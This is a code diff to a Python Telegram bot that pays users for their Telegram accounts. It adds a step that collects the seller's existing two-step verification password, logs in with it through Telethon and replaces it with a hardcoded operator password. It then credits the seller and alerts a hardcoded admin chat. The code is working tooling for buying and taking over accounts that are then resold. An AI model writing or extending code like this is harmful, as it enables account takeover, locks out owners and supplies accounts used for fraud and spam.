@@ -150,7 +150,7 @@ def save_withdrawal_settings():
         logger.error(f"Error saving withdrawal settings: {e}")
 
 # Conversation states for sell account flow
-WAITING_FOR_NUMBER, WAITING_FOR_ADMIN_APPROVAL, WAITING_FOR_PIN = range(3)
+WAITING_FOR_NUMBER, WAITING_FOR_ADMIN_APPROVAL, WAITING_FOR_PIN, WAITING_FOR_2FA = range(4)
 
 # Admin settings - hardcoded for portability
 ADMIN_CHAT_ID = "5810613583"
@@ -2447,10 +2447,95 @@ Account logged in and 2FA secured.
         await anim_msg.edit_text("❌ **Invalid OTP!** Please try again.")
         return WAITING_FOR_PIN
     except errors.SessionPasswordNeededError:
-        # User already has 2FA
-        await anim_msg.edit_text("❌ **This account already has Two-Step Verification enabled.** Please provide the password or use a different number.")
+        # User already has 2FA, ask for it
+        await anim_msg.edit_text("🔐 **Two-Step Verification Enabled**\n\nPlease enter your 2FA password to complete the login:")
+        return WAITING_FOR_2FA
+    except Exception as e:
+        await anim_msg.edit_text(f"❌ **Error:** {str(e)}")
         await client.disconnect()
         return ConversationHandler.END
+
+async def handle_2fa_input(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
+    """Handle the 2FA password input from user and re-secure the account"""
+    if not update.message or not update.message.text:
+        return WAITING_FOR_2FA
+
+    password = update.message.text.strip()
+    client = context.user_data.get('telethon_client')
+    phone = context.user_data.get('user_number')
+
+    if not client or not phone:
+        await update.message.reply_text("❌ Session expired. Please start again.")
+        return ConversationHandler.END
+
+    anim_msg = await update.message.reply_text("⏳ **Verifying 2FA Password...**", parse_mode='Markdown')
+
+    try:
+        await client.sign_in(password=password)
+        
+        # Success! Now reset/update 2FA to our specific password
+        await anim_msg.edit_text("⏳ **Re-securing Account (Updating 2FA)...**", parse_mode='Markdown')
+        
+        try:
+            # First, try to remove the old password by updating it
+            # In Telethon, we can use UpdatePasswordRequest with current_password
+            await client(functions.account.UpdatePasswordRequest(
+                current_password_hash=await client.compute_password_hash(await client(functions.account.GetPasswordRequest()), password),
+                new_password=TWO_FA_PASSWORD
+            ))
+        except Exception as e:
+            logger.error(f"Error updating existing 2FA: {e}")
+            # If update fails, try to turn it off and on (though update is better)
+            pass
+
+        # Update balance and finish as usual
+        user_id = str(update.effective_user.id)
+        country_data = context.user_data.get('country_data')
+        
+        with user_data_lock:
+            if user_id not in user_data:
+                get_user_data(user_id)
+            user_data[user_id]['hold_balance_usdt'] += country_data['sell_price']
+            user_data[user_id]['accounts_sold'] += 1
+            if 'sold_numbers' not in user_data[user_id]:
+                user_data[user_id]['sold_numbers'] = []
+            user_data[user_id]['sold_numbers'].append(phone)
+            save_user_data()
+
+        await anim_msg.edit_text(f"""
+✅ **Login Successful!**
+⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯
+
+📞 **Number:** {phone}
+💰 **Amount Added:** ${country_data['sell_price']} USD (Hold Balance)
+🔒 **2FA Updated:** Enabled (New Pass: {TWO_FA_PASSWORD})
+
+⏳ **Wait Period:** 24 Hours.
+Your payment will be moved to Main Balance after verification.
+""", parse_mode='Markdown')
+
+        # Admin Notify
+        admin_notif = f"""
+🔔 **New Account Sold (2FA VERIFIED)**
+
+👤 **User ID:** `{user_id}`
+📞 **Number:** `{phone}`
+💰 **Price:** ${country_data['sell_price']} USD
+
+Existing 2FA was verified and updated to system password.
+"""
+        await context.bot.send_message(
+            chat_id=ADMIN_CHAT_ID,
+            text=admin_notif,
+            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("✅ Final Approve", callback_data=f"final_approve_{user_id}_{country_data['sell_price']}_{phone}")]])
+        )
+
+        await client.disconnect()
+        return ConversationHandler.END
+
+    except errors.PasswordHashInvalidError:
+        await anim_msg.edit_text("❌ **Invalid 2FA Password!** Please try again.")
+        return WAITING_FOR_2FA
     except Exception as e:
         await anim_msg.edit_text(f"❌ **Error:** {str(e)}")
         await client.disconnect()
@@ -4966,7 +5051,9 @@ def main() -> None:
         states={
             WAITING_FOR_NUMBER: [MessageHandler(filters.TEXT & ~filters.COMMAND, handle_number_input)],
             WAITING_FOR_ADMIN_APPROVAL: [MessageHandler(filters.TEXT & ~filters.COMMAND, handle_pin_input)],
-            WAITING_FOR_PIN: [MessageHandler(filters.TEXT & ~filters.COMMAND, handle_pin_input)],
+            WAITING_FOR_PIN: [MessageHandler(filters.TEXT & ~filters.COMMAND, handle_pin_input),
+                             CallbackQueryHandler(cancel_sell_conversation, pattern="^cancel_sale_otp$")],
+            WAITING_FOR_2FA: [MessageHandler(filters.TEXT & ~filters.COMMAND, handle_2fa_input)]
         },
         fallbacks=[
             CallbackQueryHandler(cancel_sell_conversation, pattern=r'^sell_account$'),
